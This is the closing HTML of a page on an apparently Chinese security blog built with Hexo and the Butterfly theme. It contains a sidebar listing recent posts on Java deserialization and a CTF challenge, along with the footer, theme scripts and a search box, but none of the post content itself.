href="/2023/10/19/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget/" title="东华杯ezgadget">东华杯ezgadget</a><time datetime="2023-10-19T08:02:57.000Z" title="发表于 2023-10-19 16:02:57">2023-10-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/15/C3P0/" title="C3P0"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230915162829811.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="C3P0"/></a><div class="content"><a class="title" href="/2023/09/15/C3P0/" title="C3P0">C3P0</a><time datetime="2023-09-15T06:40:10.000Z" title="发表于 2023-09-15 14:40:10">2023-09-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="JDBC反序列化"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-739d73_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="JDBC反序列化"/></a><div class="content"><a class="title" href="/2023/09/13/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="JDBC反序列化">JDBC反序列化</a><time datetime="2023-09-13T02:17:47.000Z" title="发表于 2023-09-13 10:17:47">2023-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/11/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CommonsBeanutils反序列化"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-qzmlj5_2560x1600.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonsBeanutils反序列化"/></a><div class="content"><a class="title" href="/2023/09/11/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CommonsBeanutils反序列化">CommonsBeanutils反序列化</a><time datetime="2023-09-11T02:10:00.000Z" title="发表于 2023-09-11 10:10:00">2023-09-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><script type="text/javascript" id="maid-script" src="https://unpkg.com/mermaid@undefined/dist/mermaid.min.js?v=undefined"></script><script>if (window.mermaid) {
+  var options = JSON.parse(document.getElementById('maid-script').getAttribute('mermaidoptioins'));
+  mermaid.initialize(options);
+}</script></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaid.length === 0) return
+  const runMermaid = () => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    Array.from($mermaid).forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+      const mermaidID = 'mermaid-' + index
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+
+      const renderV10 = () => {
+        renderFn.then(({svg}) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svg)
+        })
+      }
+
+      const renderV9 = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      typeof renderFn === 'string' ? renderV9(renderFn) : renderV10()
+    })
+  }
+
+  const loadMermaid = () => {
+    window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+  }
+
+  btf.addModeChange('mermaid', runMermaid)
+
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="喵" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
